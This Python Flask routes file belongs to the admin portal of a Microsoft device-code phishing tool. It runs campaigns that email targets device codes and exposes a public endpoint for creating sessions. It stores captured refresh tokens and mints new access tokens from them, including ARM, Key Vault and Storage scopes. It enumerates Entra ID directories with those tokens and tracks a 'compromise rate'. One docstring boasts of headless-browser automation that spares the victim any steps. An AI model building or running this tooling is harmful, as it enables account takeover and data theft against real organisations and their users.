"""Flask routes for admin portal."""
from datetime import datetime, timedelta
from flask import Blueprint, render_template, request, jsonify, redirect, url_for, flash, session, g
from werkzeug.security import check_password_hash, generate_password_hash
from app import db, socketio
from app.models import SMTPConfig, AzureAppConfig, Campaign, DeviceCodeSession, CapturedToken, NotificationConfig, User
from app.campaign_report import build_campaign_report
from app.entra_enum import (
    ENTRA_SECTIONS,
    DEFAULT_ENUM_SCOPE,
    resolve_enum_client,
    resolve_enum_token_scopes,
    fetch_entra_section,
    fetch_all_entra_counts,
)
from app.identity import jwt_scope_claims
from app.notification_sender import send_session_notification
from app.device_code import request_device_code, FULL_SCOPE
from app.services import (
    create_campaign,
    launch_campaign,
    get_access_token_from_refresh,
    get_effective_device_code_config,
    send_campaign_test_email,
    get_default_email_body,
    get_default_post_auth_email_body,
)
from app.resourses.app_to_all_list import client_list as PUBLIC_CLIENT_LIST

main_bp = Blueprint("main", __name__)


def _public_clients_for_picker():
    """Device-code-capable public clients (probe + tenant-restriction filtered)."""
    return sorted(PUBLIC_CLIENT_LIST, key=lambda item: (item.get("name") or "").lower())


def _enum_request_access_token():
    """Optional JWT override from header or query (used by Entra enumeration APIs)."""
    header_token = (request.headers.get("X-Enum-Access-Token") or "").strip()
    if header_token:
        return header_token
    query_token = (request.args.get("access_token") or "").strip()
    return query_token or None


def _enum_request_client_id():
    client_id = request.args.get("client_id")
    if client_id is None:
        return None
    return client_id.strip() or None


def _campaign_edit_context(**extra):
    """Shared template context for campaign create/edit forms."""
    base = {
        "smtp_configs": SMTPConfig.query.filter_by(is_active=True).all(),
        "azure_configs": AzureAppConfig.query.filter_by(is_active=True).all(),
        "default_email_body": get_default_email_body(),
        "default_post_auth_email_body": get_default_post_auth_email_body(),
        "public_clients": _public_clients_for_picker(),
    }
    base.update(extra)
    return base


@main_bp.before_request
def require_login():
    """Enforce login for all routes except auth endpoints and static assets."""
    # Allow static, login, logout, and password-change endpoints through.
    endpoint = request.endpoint or ""
    if endpoint.startswith("static"):
        return
    public_endpoints = {
        "main.login",
        "main.change_password",
        # Public API endpoint for creating sessions by campaign api_path.
        "main.api_create_session",
    }
    if endpoint in public_endpoints:
        return

    user_id = session.get("user_id")
    g.current_user = None
    if not user_id:
        if endpoint != "main.login":
            return redirect(url_for("main.login"))
        return

    user = User.query.get(user_id)
    if not user:
        session.clear()
        return redirect(url_for("main.login"))
    g.current_user = user

    # Force password change before accessing the rest of the app.
    if user.must_change_password and endpoint not in {"main.change_password"}:
        return redirect(url_for("main.change_password"))


@main_bp.route("/dashboard")
def dashboard():
    return render_template("dashboard.html")


@main_bp.route("/mscodephish/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""
        user = User.query.filter_by(username=username).first()
        if not user or not check_password_hash(user.password_hash, password):
            flash("Invalid username or password.", "danger")
            return render_template("login.html")
        session["user_id"] = user.id
        if user.must_change_password:
            return redirect(url_for("main.change_password"))
        return redirect(url_for("main.dashboard"))
    return render_template("login.html")


@main_bp.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("main.login"))


@main_bp.route("/profile", methods=["GET", "POST"])
def profile():
    user_id = session.get("user_id")
    if not user_id:
        return redirect(url_for("main.login"))
    user = User.query.get(user_id)
    if not user:
        session.clear()
        return redirect(url_for("main.login"))
    if request.method == "POST":
        new_username = (request.form.get("username") or "").strip()
        current_password = request.form.get("current_password") or ""
        new_password = request.form.get("new_password") or ""
        confirm_password = request.form.get("confirm_password") or ""

        if not new_username:
            flash("Username cannot be empty.", "danger")
            return render_template("profile.html")

        if not check_password_hash(user.password_hash, current_password):
            flash("Current password is incorrect.", "danger")
            return render_template("profile.html")

        # Ensure username is unique if changed.
        if new_username != user.username:
            existing = User.query.filter_by(username=new_username).first()
            if existing:
                flash("That username is already in use.", "danger")
                return render_template("profile.html")
            user.username = new_username

        # Optionally change password.
        if new_password or confirm_password:
            if new_password != confirm_password:
                flash("New passwords do not match.", "danger")
                return render_template("profile.html")
            if not new_password:
                flash("New password cannot be empty.", "danger")
                return render_template("profile.html")
            user.password_hash = generate_password_hash(new_password)
            user.must_change_password = False

        db.session.commit()
        flash("Profile updated.", "success")
        return redirect(url_for("main.profile"))

    return render_template("profile.html")

@main_bp.route("/change-password", methods=["GET", "POST"])
def change_password():
    user_id = session.get("user_id")
    if not user_id:
        return redirect(url_for("main.login"))
    user = User.query.get(user_id)
    if not user:
        session.clear()
        return redirect(url_for("main.login"))
    if request.method == "POST":
        current_password = request.form.get("current_password") or ""
        new_password = request.form.get("new_password") or ""
        confirm_password = request.form.get("confirm_password") or ""
        if not check_password_hash(user.password_hash, current_password):
            flash("Current password is incorrect.", "danger")
            return render_template("change_password.html")
        if not new_password:
            flash("New password cannot be empty.", "danger")
            return render_template("change_password.html")
        if new_password != confirm_password:
            flash("New passwords do not match.", "danger")
            return render_template("change_password.html")
        user.password_hash = generate_password_hash(new_password)
        user.must_change_password = False
        db.session.commit()
        flash("Password updated successfully.", "success")
        return redirect(url_for("main.dashboard"))
    return render_template("change_password.html")


# ---------- Notifications ----------
@main_bp.route("/notifications", methods=["GET", "POST"])
def notifications():
    """Configure Slack and Discord notification settings."""
    config = NotificationConfig.query.first()
    if config is None:
        config = NotificationConfig()
        db.session.add(config)
        db.session.commit()

    if request.method == "POST":
        # Slack settings
        config.slack_enabled = request.form.get("slack_enabled") == "on"
        config.slack_bot_token = request.form.get("slack_bot_token") or None
        config.slack_channel = request.form.get("slack_channel") or None
        # Discord settings
        config.discord_enabled = request.form.get("discord_enabled") == "on"
        config.discord_bot_token = request.form.get("discord_bot_token") or None
        config.discord_channel_id = request.form.get("discord_channel_id") or None
        # Per-event toggles
        config.notify_on_session_created = request.form.get("notify_on_session_created") == "on"
        config.notify_on_status_authorized = request.form.get("notify_on_status_authorized") == "on"
        config.notify_on_status_expired = request.form.get("notify_on_status_expired") == "on"
        config.notify_on_status_declined = request.form.get("notify_on_status_declined") == "on"
        config.notify_on_status_error = request.form.get("notify_on_status_error") == "on"
        config.notify_on_status_cancelled = request.form.get("notify_on_status_cancelled") == "on"
        db.session.commit()
        flash("Notification settings saved.", "success")
        return redirect(url_for("main.notifications"))

    return render_template("notification_edit.html", config=config)


@main_bp.route("/api/notifications/test", methods=["POST"])
def api_notifications_test():
    """Send a test Slack or Discord message using credentials from the form (saved or unsaved)."""
    from app.notification_sender import send_test_notification

    data = request.get_json(silent=True) or {}
    platform = (data.get("platform") or "").strip().lower()
    ok, detail = send_test_notification(
        platform,
        slack_bot_token=data.get("slack_bot_token"),
        slack_channel=data.get("slack_channel"),
        discord_bot_token=data.get("discord_bot_token"),
        discord_channel_id=data.get("discord_channel_id"),
    )
    if ok:
        return jsonify({"ok": True, "message": detail})
    return jsonify({"ok": False, "error": detail}), 400


# ---------- SMTP Config ----------
@main_bp.route("/smtp")
def smtp_list():
    configs = SMTPConfig.query.all()
    return render_template("smtp_list.html", configs=configs)


@main_bp.route("/smtp/new", methods=["GET", "POST"])
def smtp_new():
    if request.method == "POST":
        c = SMTPConfig(
            name=request.form.get("name") or "default",
            host=request.form.get("host"),
            port=int(request.form.get("port") or 587),
            use_tls=request.form.get("use_tls") == "on",
            username=request.form.get("username") or None,
            password=request.form.get("password") or None,
            from_email=request.form.get("from_email"),
            from_name=request.form.get("from_name") or None,
        )
        db.session.add(c)
        db.session.commit()
        return redirect(url_for("main.smtp_list"))
    return render_template("smtp_edit.html", config=None)


@main_bp.route("/smtp/<int:id>/edit", methods=["GET", "POST"])
def smtp_edit(id):
    config = SMTPConfig.query.get_or_404(id)
    if request.method == "POST":
        config.name = request.form.get("name") or config.name
        config.host = request.form.get("host")
        config.port = int(request.form.get("port") or 587)
        config.use_tls = request.form.get("use_tls") == "on"
        config.username = request.form.get("username") or None
        if request.form.get("password"):
            config.password = request.form.get("password")
        config.from_email = request.form.get("from_email")
        config.from_name = request.form.get("from_name") or None
        db.session.commit()
        return redirect(url_for("main.smtp_list"))
    return render_template("smtp_edit.html", config=config)


@main_bp.route("/smtp/<int:id>/delete", methods=["POST"])
def smtp_delete(id):
    config = SMTPConfig.query.get_or_404(id)
    db.session.delete(config)
    db.session.commit()
    return redirect(url_for("main.smtp_list"))


# ---------- Azure App Config ----------
@main_bp.route("/azure")
def azure_list():
    configs = AzureAppConfig.query.all()
    return render_template("azure_list.html", configs=configs)


@main_bp.route("/azure/new", methods=["GET", "POST"])
def azure_new():
    if request.method == "POST":
        c = AzureAppConfig(
            name=request.form.get("name") or "default",
            client_id=request.form.get("client_id"),
            client_secret=request.form.get("client_secret") or None,
            tenant_id=request.form.get("tenant_id") or "common",
            scope=request.form.get("scope") or "openid profile email User.Read offline_access",
        )
        db.session.add(c)
        db.session.commit()
        return redirect(url_for("main.azure_list"))
    return render_template("azure_edit.html", config=None)


@main_bp.route("/azure/<int:id>/edit", methods=["GET", "POST"])
def azure_edit(id):
    config = AzureAppConfig.query.get_or_404(id)
    if request.method == "POST":
        config.name = request.form.get("name") or config.name
        config.client_id = request.form.get("client_id")
        config.client_secret = request.form.get("client_secret") or None
        config.tenant_id = request.form.get("tenant_id") or "common"
        config.scope = request.form.get("scope") or config.scope
        db.session.commit()
        return redirect(url_for("main.azure_list"))
    return render_template("azure_edit.html", config=config)


@main_bp.route("/azure/<int:id>/delete", methods=["POST"])
def azure_delete(id):
    config = AzureAppConfig.query.get_or_404(id)
    db.session.delete(config)
    db.session.commit()
    return redirect(url_for("main.azure_list"))


# ---------- Campaigns ----------
@main_bp.route("/campaigns")
def campaign_list():
    campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
    now = datetime.utcnow()

    # Derive a UI status per campaign based on its sessions, similar to campaign_detail.
    rows = []
    for c in campaigns:
        sessions = c.sessions.order_by(DeviceCodeSession.created_at.desc()).all()
        has_sessions = bool(sessions)
        has_pending = any(
            (s.status == "pending") and (not s.expires_at or s.expires_at > now)
            for s in sessions
        )
        if has_pending:
            ui_status = "running"
        elif has_sessions:
            ui_status = "completed"
        else:
            ui_status = c.status or "draft"
        total = len(sessions)
        pending = sum(1 for s in sessions if s.status == "pending")
        authorized = sum(1 for s in sessions if s.status == "authorized")
        errors = sum(1 for s in sessions if s.status in ("error", "expired", "denied", "cancelled"))
        rows.append(
            {
                "campaign": c,
                "ui_status": ui_status,
                "total_sessions": total,
                "pending_sessions": pending,
                "authorized_sessions": authorized,
                "error_sessions": errors,
            }
        )

    return render_template("campaign_list.html", campaigns_with_status=rows)


@main_bp.route("/campaigns/new", methods=["GET", "POST"])
def campaign_new():
    if request.method == "POST":
        email_delivery = (request.form.get("email_delivery_method") or "none").strip().lower()
        if email_delivery not in ("none", "smtp", "azure", "api"):
            email_delivery = "none"
        extra_list = []
        if request.form.get("request_arm") == "on":
            extra_list.append("https://management.azure.com/.default")
        if request.form.get("request_vault") == "on":
            extra_list.append("https://vault.azure.net/.default")
        if request.form.get("request_storage") == "on":
            extra_list.append("https://storage.azure.com/.default")
        extra_scopes = " ".join(extra_list) if extra_list else None

        # Public client_id (only used when not using Azure App config).
        public_client_id = (request.form.get("public_client_id") or "").strip() or None
        send_post_auth = request.form.get("send_post_auth_email") == "yes"
        default_email_body = get_default_email_body()
        default_post_auth_email_body = get_default_post_auth_email_body()

        c = create_campaign(
            name=request.form.get("name"),
            email_delivery_method=email_delivery,
            smtp_config_id=int(request.form.get("smtp_config_id")) if request.form.get("smtp_config_id") else None,
            azure_email_config_id=int(request.form.get("azure_email_config_id")) if request.form.get("azure_email_config_id") else None,
            azure_email_from=request.form.get("azure_email_from") or None,
            email_subject=request.form.get("email_subject"),
            email_body_html=request.form.get("email_body_html") or default_email_body,
            extra_scopes=extra_scopes,
            public_client_id=public_client_id,
            send_post_auth_email=send_post_auth,
            post_auth_email_subject=request.form.get("post_auth_email_subject") or None,
            post_auth_email_body_html=request.form.get("post_auth_email_body_html") or default_post_auth_email_body,
        )
        return redirect(url_for("main.campaign_edit", id=c.id))
    return render_template(
        "campaign_edit.html",
        campaign=None,
        **_campaign_edit_context(),
    )


@main_bp.route("/campaigns/<int:id>")
def campaign_detail(id):
    campaign = Campaign.query.get_or_404(id)
    sessions = DeviceCodeSession.query.filter_by(campaign_id=id).order_by(DeviceCodeSession.created_at.desc()).all()
    now = datetime.utcnow()
    # Derive a UI status from sessions so the badge reflects reality.
    has_sessions = bool(sessions)
    has_pending = any(
        (s.status == "pending") and (not s.expires_at or s.expires_at > now)
        for s in sessions
    )
    if has_pending:
        ui_status = "running"
    elif has_sessions:
        ui_status = "completed"
    else:
        ui_status = campaign.status or "draft"
    return render_template(
        "campaign_detail.html",
        campaign=campaign,
        sessions=sessions,
        now=now,
        ui_status=ui_status,
    )


@main_bp.route("/campaigns/<int:id>/report")
def campaign_report(id):
    """Printable security assessment report for a campaign."""
    campaign = Campaign.query.get_or_404(id)
    now = datetime.utcnow()
    sessions = DeviceCodeSession.query.filter_by(campaign_id=id).order_by(
        DeviceCodeSession.created_at.desc()
    ).all()
    report = build_campaign_report(campaign, sessions=sessions, now=now)
    embed = request.args.get("embed") in ("1", "true", "yes")
    return render_template("campaign_report.html", report=report, embed=embed)


@main_bp.route("/campaigns/<int:id>/edit", methods=["GET", "POST"])
def campaign_edit(id):
    campaign = Campaign.query.get_or_404(id)

    if request.method == "POST":
        import secrets
        campaign.name = request.form.get("name") or campaign.name
        # azure_app_config_id is no longer used for device code flow; AzureAppConfig is only used for email (azure_email_config_id).
        email_delivery = (request.form.get("email_delivery_method") or "none").strip().lower()
        if email_delivery not in ("none", "smtp", "azure", "api"):
            email_delivery = "none"
        campaign.email_delivery_method = email_delivery
        # Ensure every campaign has an API endpoint path so the link always works.
        if not campaign.api_path:
            campaign.api_path = secrets.token_hex(16)
        campaign.smtp_config_id = int(request.form.get("smtp_config_id")) if request.form.get("smtp_config_id") else None
        campaign.azure_email_config_id = int(request.form.get("azure_email_config_id")) if request.form.get("azure_email_config_id") else None
        campaign.azure_email_from = request.form.get("azure_email_from") or None
        campaign.email_subject = request.form.get("email_subject")
        default_email_body = get_default_email_body()
        default_post_auth_email_body = get_default_post_auth_email_body()
        campaign.email_body_html = request.form.get("email_body_html") or default_email_body
        campaign.send_post_auth_email = request.form.get("send_post_auth_email") == "yes"
        campaign.post_auth_email_subject = request.form.get("post_auth_email_subject") or None
        campaign.post_auth_email_body_html = request.form.get("post_auth_email_body_html") or default_post_auth_email_body

        # Update public client id (only used when not using Azure App config).
        raw_public = (request.form.get("public_client_id") or "").strip()
        campaign.public_client_id = raw_public or None
        # Extra scopes are no longer configured via checkboxes in the UI.
        db.session.commit()
        return redirect(url_for("main.campaign_detail", id=campaign.id))
    return render_template(
        "campaign_edit.html",
        campaign=campaign,
        **_campaign_edit_context(),
    )


@main_bp.route("/campaigns/send-test-email", methods=["POST"])
@main_bp.route("/campaigns/<int:id>/send-test-email", methods=["POST"])
def campaign_send_test_email(id=None):
    """Send a test device-code or post-auth email using current form settings."""
    payload = request.get_json(silent=True) or {}
    to_email = (payload.get("to_email") or "").strip()
    email_type = (payload.get("email_type") or "").strip().lower()
    campaign = Campaign.query.get(id) if id else None

    ok, err = send_campaign_test_email(to_email, email_type, payload, campaign)
    if not ok:
        return jsonify({"ok": False, "error": err or "Failed to send test email"}), 400
    return jsonify({"ok": True, "message": f"Test email sent to {to_email}."})


@main_bp.route("/campaigns/<int:id>/delete", methods=["POST"])
def campaign_delete(id):
    """Delete an entire campaign and its sessions/tokens."""
    campaign = Campaign.query.get_or_404(id)
    db.session.delete(campaign)
    db.session.commit()
    return redirect(url_for("main.campaign_list"))

@main_bp.route("/campaigns/<int:id>/launch", methods=["POST"])
def campaign_launch(id):
    # Expect JSON: { "target_emails": ["a@b.com", ...] } or comma-separated in form
    target_emails = []
    if request.is_json:
        target_emails = request.json.get("target_emails", [])
    else:
        raw = request.form.get("target_emails", "")
        target_emails = [e.strip() for e in raw.replace("\r\n", "\n").split("\n") if e.strip()]
    if not target_emails:
        return jsonify({"ok": False, "error": "No target emails provided"}), 400
    campaign, err = launch_campaign(id, target_emails)
    if campaign is None:
        return jsonify({"ok": False, "error": err}), 400

    # Notify clients that sessions for this campaign have changed.
    socketio.emit("campaign_updated", {"campaign_id": campaign.id})

    return jsonify({"ok": True, "campaign_id": campaign.id, "message": f"Launched; {len(target_emails)} sessions created.", "partial_error": err})


# ---------- API-based session creation ----------
@main_bp.route("/d/<path_token>", methods=["POST"])
def api_create_session(path_token):
    """
    Create a device code session via API for a campaign whose delivery method is 'api'.
    The campaign's api_path is used as the random endpoint segment.
    """
    campaign = Campaign.query.filter_by(api_path=path_token).first()
    # API link is always enabled; just require a matching campaign.
    if not campaign:
        return jsonify({"ok": False, "error": "Campaign not found"}), 404

    try:
        tenant_id, client_id = get_effective_device_code_config(campaign)
    except ValueError as e:
        return jsonify({"ok": False, "error": str(e)}), 400

    # Optional identifier for the target (e.g. email/username) from JSON or form.
    target = None
    if request.is_json and request.json:
        target = request.json.get("target") or request.json.get("email") or request.json.get("username")
    if target is None and request.form:
        target = request.form.get("target") or request.form.get("email") or request.form.get("username")

    # IP address of the caller.
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "")

    # Build scope: FULL_SCOPE plus any campaign extras.
    scope = FULL_SCOPE
    extra = (campaign.extra_scopes or "").strip()
    if extra:
        scope = f"{scope} {extra}".strip()

    try:
        resp = request_device_code(
            tenant_id,
            client_id,
            scope,
        )
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

    expires_in = resp.get("expires_in", 900)
    session = DeviceCodeSession(
        campaign_id=campaign.id,
        target_email=target,
        user_code=resp.get("user_code"),
        device_code=resp.get("device_code"),
        verification_uri=resp.get("verification_uri", "https://microsoft.com/devicelogin"),
        message=resp.get("message", ""),
        expires_at=datetime.utcnow() + timedelta(seconds=expires_in),
        status="pending",
        source_ip=ip,
    )
    db.session.add(session)
    db.session.commit()
    # Notify about new session via API.
    send_session_notification(session, event="session_created")

    # Notify clients that sessions for this campaign have changed.
    socketio.emit("campaign_updated", {"campaign_id": campaign.id})

    return jsonify({
        "ok": True,
        "campaign_id": campaign.id,
        "session_id": session.id,
        "user_code": session.user_code,
        "verification_uri": session.verification_uri,
        "message": session.message,
        "expires_in": expires_in,
    })


@main_bp.route("/r/<path_token>", methods=["POST", "GET"])
def api_create_session_v2(path_token):
    """
    This endpint dose the A headless browser automates this by directly entering the generated Device Code into the webpage behind the scenes. This defeats the 10-minute token validity limitation and eliminates the need for the victim to manually perform these steps, elevating the efficiency of the attack to a new level.
    """
    campaign = Campaign.query.filter_by(api_path=path_token).first()
    # API link is always enabled; just require a matching campaign.
    if not campaign:
        return jsonify({"ok": False, "error": "Campaign not found"}), 404

    try:
        tenant_id, client_id = get_effective_device_code_config(campaign)
    except ValueError as e:
        return jsonify({"ok": False, "error": str(e)}), 400

    scope = FULL_SCOPE
    try:
        resp = request_device_code(
            tenant_id,
            client_id,
            scope,
        )
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

    return ""

@main_bp.route("/api/campaigns/<int:id>/version")
def api_campaign_version(id):
    """Lightweight endpoint so the UI can detect campaign/session changes via polling."""
    campaign = Campaign.query.get_or_404(id)
    sessions = DeviceCodeSession.query.filter_by(campaign_id=id).order_by(DeviceCodeSession.created_at.desc()).all()
    now = datetime.utcnow()

    has_sessions = bool(sessions)
    has_pending = any(
        (s.status == "pending") and (not s.expires_at or s.expires_at > now)
        for s in sessions
    )
    if has_pending:
        ui_status = "running"
    elif has_sessions:
        ui_status = "completed"
    else:
        ui_status = campaign.status or "draft"

    total = len(sessions)
    pending = sum(1 for s in sessions if s.status == "pending")
    authorized = sum(1 for s in sessions if s.status == "authorized")
    errors = sum(1 for s in sessions if s.status in ("error", "expired", "denied", "cancelled"))
    last_created = sessions[0].created_at.isoformat() if sessions and sessions[0].created_at else None

    return jsonify({
        "ok": True,
        "campaign_id": campaign.id,
        "status": ui_status,
        "total_sessions": total,
        "pending_sessions": pending,
        "authorized_sessions": authorized,
        "error_sessions": errors,
        "last_session_created_at": last_created,
    })

@main_bp.route("/campaigns/<int:campaign_id>/sessions/<int:session_id>/deactivate", methods=["POST"])
def session_deactivate(campaign_id, session_id):
    """Set session status to cancelled (stops polling)."""
    session = DeviceCodeSession.query.filter_by(id=session_id, campaign_id=campaign_id).first_or_404()
    old_status = session.status
    session.status = "cancelled"
    db.session.commit()
    send_session_notification(session, event="status_cancelled", old_status=old_status)
    socketio.emit("campaign_updated", {"campaign_id": campaign_id})
    return redirect(url_for("main.campaign_detail", id=campaign_id))


@main_bp.route("/campaigns/<int:campaign_id>/sessions/<int:session_id>/delete", methods=["POST"])
def session_delete(campaign_id, session_id):
    """Delete a session (and its captured token if any)."""
    session = DeviceCodeSession.query.filter_by(id=session_id, campaign_id=campaign_id).first_or_404()
    db.session.delete(session)
    db.session.commit()
    socketio.emit("campaign_updated", {"campaign_id": campaign_id})
    return redirect(url_for("main.campaign_detail", id=campaign_id))


@main_bp.route("/campaigns/<int:campaign_id>/sessions/delete-all", methods=["POST"])
def sessions_delete_all(campaign_id):
    """Delete all sessions for a campaign that do NOT have a captured token.

    Authorized sessions with captured tokens are preserved so tokens are not removed.
    """
    sessions = DeviceCodeSession.query.filter_by(campaign_id=campaign_id).all()
    deleted = 0
    for s in sessions:
        if s.captured_token:
            continue
        db.session.delete(s)
        deleted += 1
    db.session.commit()
    socketio.emit("campaign_updated", {"campaign_id": campaign_id})
    return redirect(url_for("main.campaign_detail", id=campaign_id))


# ---------- Tokens ----------
@main_bp.route("/tokens")
def token_list():
    from app.resourses.resource_list import resource_list as ALL_RESOURCES

    tokens = CapturedToken.query.order_by(
        CapturedToken.created_at.desc(), CapturedToken.id.desc()
    ).all()
    # Build a lightweight list for the UI: name, appId, and permission id.
    resources = [
        {
            "name": r.get("name"),
            "appId": r.get("appId"),
            "p_id": r.get("p_id"),
        }
        for r in ALL_RESOURCES
        if r.get("name") and r.get("appId") and r.get("p_id")
    ]
    return render_template(
        "token_list.html",
        tokens=tokens,
        resources=resources,
        public_clients=_public_clients_for_picker(),
    )


@main_bp.route("/tokens/<int:id>/enum")
def token_enum(id):
    """Live Entra ID enumeration workspace for a captured token."""
    token = CapturedToken.query.get_or_404(id)
    default_client_id, default_client_name = resolve_enum_client(id)
    token_scopes = resolve_enum_token_scopes(id)
    return render_template(
        "token_enum.html",
        token=token,
        sections=ENTRA_SECTIONS,
        default_client_id=default_client_id,
        default_client_name=default_client_name,
        token_scopes=token_scopes,
        initial_access_token=token.access_token or "",
        default_enum_scope=DEFAULT_ENUM_SCOPE,
    )


@main_bp.route("/api/tokens/<int:id>/entra/counts", methods=["GET"])
def api_token_entra_counts(id):
    """Total counts for all Entra enumeration sections."""
    CapturedToken.query.get_or_404(id)
    client_id = _enum_request_client_id()
    access_token = _enum_request_access_token()
    data, err = fetch_all_entra_counts(id, client_id=client_id, access_token_override=access_token)
    if err:
        return jsonify({"ok": False, "error": err}), 400
    return jsonify(data)


@main_bp.route("/api/tokens/<int:id>/entra/<section>", methods=["GET"])
def api_token_entra_enum(id, section):
    """Enumerate Entra ID objects via Microsoft Graph using a captured refresh token."""
    CapturedToken.query.get_or_404(id)
    client_id = _enum_request_client_id()
    access_token = _enum_request_access_token()
    next_link = request.args.get("next") or None
    try:
        data, err = fetch_entra_section(
            id,
            section,
            client_id=client_id,
            next_link=next_link,
            access_token_override=access_token,
        )
    except ValueError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 404
    if err:
        return jsonify({"ok": False, "error": err}), 400
    return jsonify(data)


@main_bp.route("/api/tokens/<int:id>/access-token", methods=["POST"])
def api_get_access_token(id):
    """Get a fresh access token using the stored refresh token. Optional JSON: { \"scope\": \"https://...\", \"client_id\": \"...\" }."""
    scope = None
    client_id = None
    if request.is_json and request.json:
        scope = request.json.get("scope") or None
        client_id = request.json.get("client_id") or None
    if scope is None and request.form:
        scope = request.form.get("scope") or None
    if client_id is None and request.form:
        client_id = request.form.get("client_id") or None
    data, err = get_access_token_from_refresh(id, scope=scope, client_id=client_id)
    if err:
        return jsonify({"ok": False, "error": err}), 400
    access_token = data.get("access_token")
    return jsonify({
        "ok": True,
        "access_token": access_token,
        "expires_in": data.get("expires_in"),
        "scope": data.get("scope"),
        "token_scopes": jwt_scope_claims(access_token) if access_token else {},
        "token_url": data.get("token_url"),
        "client_id": data.get("client_id"),
        "requested_scope": data.get("requested_scope"),
    })


@main_bp.route("/api/tokens/<int:id>/jwt-info", methods=["POST"])
def api_token_jwt_info(id):
    """Decode scope/role claims from a JWT access token."""
    CapturedToken.query.get_or_404(id)
    access_token = ""
    if request.is_json and request.json:
        access_token = (request.json.get("access_token") or "").strip()
    if not access_token:
        return jsonify({"ok": False, "error": "access_token required"}), 400
    return jsonify({"ok": True, "token_scopes": jwt_scope_claims(access_token)})


@main_bp.route("/tokens/<int:id>/delete", methods=["POST"])
def token_delete(id):
    """Delete a captured token."""
    token = CapturedToken.query.get_or_404(id)
    db.session.delete(token)
    db.session.commit()
    return redirect(url_for("main.token_list"))


# ---------- API for dashboard / campaign stats ----------
def _dashboard_stats():
    """Aggregate platform-wide metrics for the dashboard."""
    now = datetime.utcnow()
    campaigns = Campaign.query.count()
    sessions = DeviceCodeSession.query.count()
    pending = DeviceCodeSession.query.filter_by(status="pending").count()
    authorized = DeviceCodeSession.query.filter_by(status="authorized").count()
    expired = DeviceCodeSession.query.filter_by(status="expired").count()
    error = DeviceCodeSession.query.filter_by(status="error").count()
    denied = DeviceCodeSession.query.filter(
        DeviceCodeSession.status.in_(("denied", "cancelled"))
    ).count()
    tokens = CapturedToken.query.count()
    emails_sent = DeviceCodeSession.query.filter_by(email_sent=True).count()
    personal = DeviceCodeSession.query.filter_by(account_type="personal").count()
    corporate = DeviceCodeSession.query.filter_by(account_type="corporate").count()
    unknown_acct = max(0, sessions - personal - corporate)

    compromise_rate = round((authorized / sessions) * 100, 1) if sessions else 0.0
    delivery_rate = round((emails_sent / sessions) * 100, 1) if sessions else 0.0

    running_campaigns = 0
    campaign_rows = []
    for c in Campaign.query.order_by(Campaign.created_at.desc()).limit(12).all():
        sess_list = c.sessions.all()
        has_pending = any(
            s.status == "pending" and (not s.expires_at or s.expires_at > now)
            for s in sess_list
        )
        if has_pending:
            running_campaigns += 1
            ui_status = "running"
        elif sess_list:
            ui_status = "completed"
        else:
            ui_status = c.status or "draft"
        total = len(sess_list)
        campaign_rows.append({
            "id": c.id,
            "name": c.name or "Unnamed",
            "ui_status": ui_status,
            "total_sessions": total,
            "authorized_sessions": sum(1 for s in sess_list if s.status == "authorized"),
            "pending_sessions": sum(1 for s in sess_list if s.status == "pending"),
            "created_at": c.created_at.isoformat() if c.created_at else None,
        })

    recent_authorized = []
    for s in (
        DeviceCodeSession.query.filter_by(status="authorized")
        .order_by(DeviceCodeSession.updated_at.desc())
        .limit(10)
        .all()
    ):
        recent_authorized.append({
            "id": s.id,
            "campaign_id": s.campaign_id,
            "campaign_name": (s.campaign.name if s.campaign else None) or "Unnamed",
            "display_target": s.display_target,
            "user_email": s.user_email or s.target_email or "-",
            "account_type": s.account_type or "-",
            "updated_at": s.updated_at.isoformat() if s.updated_at else None,
        })

    outcome_max = max(sessions, 1)
    outcomes = [
        {"label": "Authorized", "value": authorized, "color": "#f85149", "pct": round(authorized / outcome_max * 100, 1)},
        {"label": "Pending", "value": pending, "color": "#d29922", "pct": round(pending / outcome_max * 100, 1)},
        {"label": "Expired", "value": expired, "color": "#8b949e", "pct": round(expired / outcome_max * 100, 1)},
        {"label": "Error", "value": error, "color": "#f85149", "pct": round(error / outcome_max * 100, 1)},
        {"label": "Denied / cancelled", "value": denied, "color": "#6e7681", "pct": round(denied / outcome_max * 100, 1)},
    ]

    accounts = [
        {"label": "Corporate", "value": corporate, "color": "#388bfd", "pct": round(corporate / max(sessions, 1) * 100, 1)},
        {"label": "Personal (MSA)", "value": personal, "color": "#8957e5", "pct": round(personal / max(sessions, 1) * 100, 1)},
        {"label": "Unknown", "value": unknown_acct, "color": "#8b949e", "pct": round(unknown_acct / max(sessions, 1) * 100, 1)},
    ]

    return {
        "generated_at": now.isoformat() + "Z",
        "campaigns": campaigns,
        "campaigns_running": running_campaigns,
        "sessions": sessions,
        "pending": pending,
        "authorized": authorized,
        "expired": expired,
        "error": error,
        "denied": denied,
        "captured_tokens": tokens,
        "emails_sent": emails_sent,
        "compromise_rate": compromise_rate,
        "delivery_rate": delivery_rate,
        "account_personal": personal,
        "account_corporate": corporate,
        "account_unknown": unknown_acct,
        "outcomes": outcomes,
        "accounts": accounts,
        "campaigns_recent": campaign_rows,
        "recent_authorized": recent_authorized,
    }


@main_bp.route("/api/stats")
def api_stats():
    return jsonify(_dashboard_stats())
